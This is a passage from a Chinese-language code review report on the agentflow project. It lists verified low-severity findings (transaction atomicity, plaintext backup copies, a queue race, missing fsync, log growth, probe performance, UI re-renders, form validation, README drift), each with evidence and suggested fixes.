- **领域**：持久化层｜**分类**：数据完整性
- **状态**：待修复
- **问题**：create_governed_task_with_acceptance 在一个事务里写 tasks/task_acceptance_criteria/task_policies（persistence/src/lib.rs:386-417），但 task_creation.rs:273-279 的 delivery_records 插入和 :281 起的 api_egress 审计事件在事务提交之后单独执行。若 daemon 在两步之间崩溃/被杀，任务存在但没有 delivery_records 行。delivery.rs:87/138/150 全部是 UPDATE delivery_records ... WHERE task_id=?，对缺行任务 rows_affected=0 静默无操作，没有任何一处检查。
- **未来风险**：崩溃窗口虽小但真实存在（本项目的核心场景就是长期跑后台任务、随时可能断电/强杀）。命中后该任务的交付状态永远停在『不存在』：delivery_start/refresh 看似成功但什么都没记录，UI 交付面板异常，且这种静默 no-op 类问题极难事后排查。同类模式（先提交主行、再补辅行）以后被复制会扩大风险面。
- **改进建议**：把 delivery_records 插入并入 create_governed_task_with_acceptance 的同一事务（可通过给 Store 方法传入延伸写入回调，或把 delivery_records 的插入下沉到 persistence 层）；delivery 的 UPDATE 改用 INSERT ... ON CONFLICT(task_id) DO UPDATE 以自愈缺行；审计事件写入失败至少要记日志。
- **核查证据**：crates/persistence/src/lib.rs:386-417 的事务在 :417 提交后，crates/orchestrator/src/task_creation.rs:273-279 才单独插入 delivery_records（全仓唯一插入点），:280-290 的 api_egress 审计事件也在事务外；delivery.rs:87/138/150 三处 UPDATE delivery_records ... WHERE task_id=? 的 rows_affected 均未检查，缺行时静默 no-op，机制属实。但下调为 low：崩溃窗口仅为 commit 与 INSERT 之间的毫秒级间隙且每任务只出现一次；命中后影响限于该单个任务的交付跟踪，且 task_delivery_refresh 对 LocalMerge 模式在 delivery.rs 中直接提前返回，实际受影响的只有 GitHubPr/GitLabMr 模式的交付面板，不破坏任务主状态机

### L04. 备份恢复流程留下明文数据库副本且永不清理，与本地数据加密承诺漂移

- **位置**：`crates/persistence/src/protection.rs:238`
- **领域**：持久化层｜**分类**：安全/资源泄漏
- **状态**：待修复
- **问题**：restore_encrypted_backup 把被替换的旧库重命名为 agentflow.pre-restore-<时间戳>.db（protection.rs:238-243）后就再也没有任何代码引用它：不加密、不设 0600（restrict_file 只对新库执行，:254）、不进入 rotate_backups 的 5 份轮转（:180-195 只匹配 .afbak）、也没有清理任务删除它。类似地 create_encrypted_backup 的明文临时文件 .{suffix}.db.tmp 删除失败被 let _ 吞掉（:175）。同目录还放着 local-data.key 明文密钥（:107-110），使 .afbak 加密对『拷走整个数据目录』的攻击者形同虚设。
- **未来风险**：每次执行备份恢复都会永久多出一份全量明文数据库（含任务描述、diff 统计、审查内容等），多次恢复后磁盘被这些孤儿文件占满；用户以为『加密备份』保护了数据，实际数据目录里同时躺着明文副本和解密密钥。将来接入云同步/公司合规审计时会成为直接的数据暴露点。
- **改进建议**：恢复成功后对 pre-restore 副本用与 .afbak 相同的格式加密并纳入轮转（或在下次 daemon 启动完成 integrity_check 后删除）；对其立即 restrict_file(0600)；rotate_backups 同时清理遗留的 *.tmp 与 pre-restore-*.db；文档中明确 local-data.key 文件回退模式的威胁模型。
- **核查证据**：crates/persistence/src/protection.rs:238-243 将旧库重命名为 pre-restore-<时间戳>.db 后仅作为返回值返回（tests.rs:179 只断言其存在），全仓无任何加密/删除/引用它的代码；restrict_file 只对新库执行（protection.rs:254），pre-restore 副本保留原权限且为明文；rotate_backups（:180-195）只匹配 .afbak 扩展名，不清理 pre-restore-*.db 与 *.tmp；create_encrypted_backup 的明文临时文件删除失败被 let _ 吞掉（:175）；local-data.key 以明文文件存于同目录（:107-110 cache_data_key，虽有 0600 但与密文同目录），拿走整个数据目录即可解密 .afbak，各点均属实，low 定级恰当

### L05. finish_queue_item 无状态守卫地覆写队列行，与 IPC 再入队存在竞态，任务会被静默卡死

- **位置**：`crates/daemon/src/scheduler.rs:121`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：并发
- **状态**：待修复
- **问题**：finish_queue_item 的成功分支（scheduler.rs:121-126）执行 UPDATE daemon_queue SET state='COMPLETED' ... WHERE task_id=?，失败分支（scheduler.rs:138-146）同样没有 AND state='RUNNING' 守卫。而 enqueue_task（lib.rs:724）可以在任意 IPC 请求（TaskReject、TaskResumeWithGuidance、PermissionDecide 批准等）里把该行 upsert 回 QUEUED。drive_task 在返回前就已把任务状态写成 WaitingForHumanApproval/Blocked 等可再入状态，之后还有通知、SQL 等 await 才轮到 finish_queue_item；若用户/自动化在这个窗口内触发 reject/resume，新入队的 QUEUED 行会被旧 worker 的 COMPLETED 覆写。
- **未来风险**：任务在 UI 上显示 ReadyForRevision/ReadyForDevelopment，但 daemon_queue 行是 COMPLETED，调度器永远不再认领；用户看到任务"排队中"却永不执行，只能靠再点一次操作碰运气。随着桌面端加入自动化（脚本化审批、CLI 批量操作），命中概率会显著上升。失败分支同理会把用户刚重置的 not_before/attempts 覆写回退避状态。
- **改进建议**：给 finish_queue_item 的两条 UPDATE 都加上 AND state='RUNNING'（rows_affected==0 时记日志并跳过），保证只有认领该行的 worker 能关闭它；enqueue_task 已经是 upsert，语义不受影响。补一条并发测试：drive 完成前并发 enqueue，断言队列行仍为 QUEUED。
- **核查证据**：crates/daemon/src/scheduler.rs:121 与 138 的两条 UPDATE 确实只按 task_id 过滤、无 AND state='RUNNING'，而 claim_next 的认领语句是有守卫的（scheduler.rs:67-74），对比可见是遗漏；crates/daemon/src/lib.rs:724 的 upsert 会把行改回 QUEUED，TaskReject/TaskResumeWithGuidance/TaskRepair/PermissionDecide 均会调用（lib.rs:487/492/516/548），且全仓无任何对账循环把“可运行但无队列行”的任务补回队列（maintenance_loop 只做权限过期与存储清理，lib.rs:298-326），所以一旦被覆写确实永久卡死。降级为 low：可竞态的窗口只是 drive_task 最后一次状态写入到 finish_queue_item 的 UPDATE 之间的两次 SQLite 查询（development.rs:29 的 task_summary + scheduler.rs:45），量级毫秒；且发现中“之后还有通知等 await”与代码不符——notify_task 在 UPDATE 之后（scheduler.rs:126-127）。

### L06. 发布槽位写入无 fsync、健康检查前先切 current 标记，崩溃可留下截断制品或未验证版本

- **位置**：`crates/release-engine/src/lib.rs:146`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：升级/迁移风险
- **状态**：待修复
- **问题**：SlotManager::stage（lib.rs:146-147）用 tokio::fs::write 写入制品后直接 rename，没有 sync_all/sync_data，掉电或崩溃后 rename 可能已持久化而数据块未落盘，得到一个以正式版本号命名的零长度/截断槽位文件（stage 前的签名校验只验证了内存里的字节）。activate_with_health（lib.rs:167-183）先把 current 标记切到新版本再跑健康检查，回滚只在同一进程内完成；若健康检查过程中进程崩溃，current 永久指向未验证版本，且 previous 文件只在成功路径写入（lib.rs:174-176），此时是旧值或缺失。另外 slots/ 目录每次发布累积完整制品，从不清理。
- **未来风险**：升级期间断电/崩溃后，下次启动会把截断的二进制或未通过健康检查的版本当作当前版本加载，而回滚标记又不可靠，daemon 陷入起不来又回不去的状态，需要人工修复；slots 目录随版本数线性膨胀占满用户磁盘。
- **改进建议**：stage 写临时文件后调用 sync_all 再 rename，并对 rename 后的最终文件复核一次 SHA-256；activate 采用 current.pending -> 健康检查通过 -> 才 rename 覆盖 current 的顺序（把"意图"与"生效"分离），previous 在切换前先写好；保留最近 N 个 slot，其余清理。
- **核查证据**：crates/release-engine/src/lib.rs:146-147 确为 tokio::fs::write + rename，无 sync_all，也未对 rename 后的最终文件复核 SHA-256（校验只在 verify_artifact 对内存字节做，lib.rs:104-117）；activate_with_health 在 lib.rs:171-172 先把 current 切到新版本，健康检查在其后（lib.rs:173），previous 仅在成功路径写入（lib.rs:174-176），回滚只在同进程内（lib.rs:179-182）；slots/ 目录无任何清理逻辑。维持 low 并进一步说明影响有限：SlotManager 目前只被本 crate 的 tests.rs:29/64 使用，没有任何其它 crate 依赖 agentflow-release-engine（仅 crates/release-engine/Cargo.toml 定义、bin/verify_macos_bundle.rs 用 macos_gate），真实自更新走的是 daemon/src/main.rs:266-333 的 install_service 双槽 rename，所以这不是当前活跃升级路径上的缺陷。

### L07. LaunchAgent 日志无轮转且 KeepAlive 崩溃循环会持续写盘，daemon 自身日志无界增长

- **位置**：`crates/daemon/src/main.rs:300`
- **领域**：运行时（进程/Git/守护进程）｜**分类**：数据增长无界
- **状态**：待修复
- **问题**：install_service 生成的 plist（main.rs:300-312）设置 KeepAlive=true，StandardOutPath/StandardErrorPath 指向 data_dir/logs/agentflowd.log 与 agentflowd-error.log。launchd 不轮转这两个文件，代码里也没有任何轮转/清理逻辑（storage_cleanup 只处理 run_dir 的原始日志，见 storage.rs:144-160）。若 daemon 因持久性故障启动即退出（例如 agentflowd.lock 被另一实例持有返回 "agentflowd is already running"、DB 损坏），KeepAlive 会让 launchd 不断重启，错误日志以重启频率持续追加。
- **未来风险**：长期运行数月后 agentflowd*.log 无上限膨胀；一旦进入崩溃循环（升级不兼容、数据库损坏），错误日志会在数小时内写出巨量重复内容，加速磁盘耗尽并拖垮同目录的 SQLite。用户几乎不会主动去看这个目录。
- **改进建议**：plist 增加 ThrottleInterval（如 10 秒）抑制崩溃循环频率；daemon 启动时检查两份日志大小，超过阈值（如 50MB）就截断或滚动为 .1 备份；或者把 tracing 输出改为自带 max size 的滚动文件 appender，StandardOutPath 只留崩溃兜底。
- **核查证据**：crates/daemon/src/main.rs:300 的 plist 确为 KeepAlive=true 且未设置 ThrottleInterval，StandardOutPath/StandardErrorPath 指向 logs/agentflowd.log 与 agentflowd-error.log（main.rs:304-312、289-290），代码里无任何轮转/截断逻辑，storage_cleanup 只清 run_dir 原始日志（orchestrator/src/storage.rs:144-160）。维持 low 并指出发现夸大之处：launchd 对 KeepAlive 服务默认有 10 秒重启节流，且日志订阅是 EnvFilter::from_default_env()（main.rs:45-47），未设 RUST_LOG 时几乎只输出 ERROR，所以“数小时写出巨量内容加速磁盘耗尽”不成立，实际是长期缓慢无界增长。

### L08. provider_list 每次调用都全量重扫注册表并对每个外部 Provider 起进程探活

- **位置**：`crates/orchestrator/src/lifecycle.rs:332`
- **领域**：Provider 适配与契约｜**分类**：可扩展性瓶颈
- **状态**：待修复
- **问题**：provider_list（lifecycle.rs:332-402）每次被调用都会：refresh_provider_registry 重新读盘并重验所有包签名（task_queries.rs:2-10，包含对每个可执行文件全量读入做 SHA-256，registry.rs:171-174）；调用 env_check 并发 spawn 约 20 个子进程（--version/--help/auth status，未登录的 Claude 还会跑最长 6 秒的 claude doctor）；再对每个外部 Provider 逐个（串行 await）spawn sidecar 进程完成 handshake+health probe（lifecycle.rs:366-374）。桌面设置页与每次任务 preflight（preflight.rs:78 调 provider_list）都会触发这条全量路径，且外部 Provider probe 没有任何缓存或并发限制。
- **未来风险**：随着安装的外部 Provider 包数量与大小增长（每个包一次全文件哈希 + 一次进程启动握手），设置页和任务创建 preflight 的延迟线性甚至超线性变差；一个启动慢（接近 STARTUP_TIMEOUT=10 秒）的 sidecar 会让每次 provider_list 阻塞数十秒，用户感知为界面卡死；频繁刷新还会持续制造短命进程。
- **改进建议**：给外部 Provider 的 probe 结果加 TTL 缓存（可复用 runtime_probe_cache 的模式并以 manifest 哈希为 key），probe 用 join_all 并发并设总时限；签名/摘要验证结果按 (路径, mtime, 文件大小) 缓存，只有包变化时重验；provider_list 拆分为「快路径（缓存目录态）+ 显式刷新」两个 API。
- **核查证据**：lifecycle.rs:332-334 每次调用先 refresh_provider_registry（task_queries.rs:2-10 重新 discover，registry.rs:171-174 对每个包可执行文件全量读入做 SHA-256）再 env_check 并发 spawn 十余个子进程；lifecycle.rs:366-374 对每个外部 Provider 在 for 循环中串行 await spawn sidecar 完成 handshake+health（STARTUP_TIMEOUT=10 秒，client.rs:19），无缓存无并发；preflight.rs:78 每次任务预检都调 provider_list，runtime_probe_cache 只覆盖内置 CLI 探针不覆盖外部 probe。

### L09. useExecutionTree 订阅整个 buffers 对象，日志每次刷新触发整个详情页重渲染

- **位置**：`apps/desktop/src/hooks/useExecutionTree.ts:17`
- **领域**：桌面端｜**分类**：性能
- **状态**：待修复
- **问题**：useExecutionTree.ts:17 用 useLogStore((s) => s.buffers) 订阅了整个缓冲 Record，而 append/setHistory 每次都会创建新的 buffers 对象引用；该 hook 在 TaskDetail.tsx:59 顶层调用，因此直播期间每一次 rAF 批量 flush（后端 300ms 轮询节奏下约每秒 3 次，多 run 并发更高）都会让整个 TaskDetail 组件树（执行树、TaskHeader、当前 Tab 内容、motion 动画）重渲染一遍；lastActivityAt 的 useMemo（依赖 buffers）也随之全量重算。实际只需要 RUNNING run 的最后一行时间戳。
- **未来风险**：当任务并发多个 run、日志输出密集（验证步骤刷屏）时，详情页出现持续掉帧，与发现 2 的后端开销叠加后长任务观察体验明显劣化；后续任何人往 TaskDetail 树里加重组件（如 Monaco diff 常驻）都会把这个隐性放大器踩爆。
- **改进建议**：把 lastActivityAt 的推导下沉为细粒度 selector：在 logStore 里单独维护 per-run 的 lastTs 字段（append 时顺带更新），useExecutionTree 只订阅相关 runId 的 lastTs；或用 zustand 的 shallow/自定义 equality 只比较所需 run 的行数与尾时间戳。
- **核查证据**：useExecutionTree.ts:17 用 useLogStore((s) => s.buffers) 订阅整个 Record，而 append/setHistory（logStore.ts:56、63-74）每次都返回新 buffers 对象引用（zustand 默认 Object.is 比较必判不等）；该 hook 在 TaskDetail.tsx:58 顶层调用，直播期间 useRunLogStream 的每次 rAF flush 都触发整个 TaskDetail 树重渲染，lastActivityAt 的 useMemo（useExecutionTree.ts:34-46）也随 buffers 全量重算，实际只需 RUNNING run 的尾行时间戳（第 42-43 行）。确认为 low。

### L10. ExecutionNodeSection 表单校验缺口：端口可提交 0、私钥路径不 trim，后端错误文案无法定位字段

- **位置**：`apps/desktop/src/routes/settings/ExecutionNodeSection.tsx:116`
- **领域**：桌面端｜**分类**：正确性边界/可用性
- **状态**：待修复
- **问题**：当前分支正在改的这个文件里：端口输入 onChange 用 Number(event.target.value)，清空输入框时 Number("") === 0，保存按钮的 disabled 条件（ExecutionNodeSection.tsx:111）只校验 name/host/username/workRoot 四个字段，port=0 会被提交；新增的 identityFile 输入（第 118 行）不做 trim，带首尾空格的路径会原样提交。后端 validate_execution_node（execution_nodes.rs:259-296）确实会拦下 port==0 和非绝对路径，但基础字段的错误统一返回 "invalid execution node fields"（execution_nodes.rs:271），不指明是哪个字段。
- **未来风险**：用户误清空端口或粘贴带空格的路径后点保存，得到一条无法定位字段的英文错误 toast，只能逐项试错；配置远程节点本就是高摩擦操作，这类模糊失败会直接劝退用户使用远程验证功能，也会以「保存失败」工单形式反复出现。
- **改进建议**：前端：端口解析失败或超出 1-65535 时禁用保存并就地提示；identityFile 在 update 时 trim，非绝对路径时就地告警（不必等后端）。后端：validate_execution_node 的错误信息带上具体字段名，前端 errorLine 按字段映射成中文提示。
- **核查证据**：ExecutionNodeSection.tsx:116 端口 onChange 用 Number(event.target.value)，清空输入即 Number("")===0；保存按钮 disabled 条件（ExecutionNodeSection.tsx:111）只校验 name/host/username/workRoot 四项，port=0 可提交；第 118 行 identityFile 仅做 `value || null` 不 trim。后端 execution_nodes.rs:268-271 确会拦下 port==0，但基础字段统一返回 "invalid execution node fields" 不指明字段；仅需修正一点：identityFile 分支（execution_nodes.rs:280-282）有专属错误文案 "SSH identity file must be an existing absolute file"，且带首尾空格的路径会被 is_absolute/is_file 检查拦下，故「无法定位字段」只适用于端口等基础字段。核心claim成立，维持 low。

### L11. README 的 Provider 支持描述已落后于代码：Qoder 完全缺席

- **位置**：`README.md:3`
- **领域**：工程化横切面｜**分类**：文档漂移
- **状态**：待修复
- **问题**：README 第 3 行写“一等 workflow adapter 覆盖 Claude Code、Codex、Gemini CLI、Qwen Code；桌面目录可检测安装 Grok Build、Kimi Code、MiniMax CLI”，全文没有出现 Qoder。但代码现状是：config/provider-compatibility.json 第 32-40 行 qodercli 已有 verifiedVersions ["1.1.3"]、runtimeProbe "qoder_plan_json" 和必需参数；crates/agent-adapters/src/support.rs 第 690/757/850 行已实现 qoder_plan_json 探针路径；provider-compatibility.yml 把 Qoder CLI 安装进 pinned 门禁；提交 76f5225 标题即 "add Qoder and Grok planning support"。抽查的 06.01/06.02 两份验收文档与代码基本吻合（声称的文件、迁移、测试均存在），文档漂移主要集中在这份对外 README。
- **未来风险**：README 是外部使用者判断“哪些 CLI 能用、处于什么支持等级”的唯一英文入口；它与支持矩阵脱节后，用户会绕过已验证的 Qoder 路径，或反过来对 README 声称支持的组合建立错误预期。随着 07 号文档规划的 Trae/Cursor 接入，这个清单只会漂得更远。
- **改进建议**：把 README 的 Provider 段改为从 config/provider-compatibility.json 生成（xtask 已经是生成器，顺手渲染一张支持等级表），或至少在 07 号文档的 DoD 清单里加一条“更新 README Provider 清单”，让每次接入新 CLI 时该项进入验收。
- **核查证据**：grep -i qoder README.md 零命中，README.md:3 的 adapter 清单只列 Claude Code/Codex/Gemini CLI/Qwen Code 及可检测安装的 Grok/Kimi/MiniMax；而 config/provider-compatibility.json:32-37 的 qodercli 已有 verifiedVersions ["1.1.3"]、runtimeProbe "qoder_plan_json" 和 4 个必需参数，crates/agent-adapters/src/support.rs:690/757/850 实现了 qoder_plan_json 探针路径，provider-compatibility.yml:28 已把 Qoder 装进 pinned 门禁，git log 中 76f5225 即 "feat(provider): add Qoder and Grok planning support"，文档确已落后于代码，low 恰当。
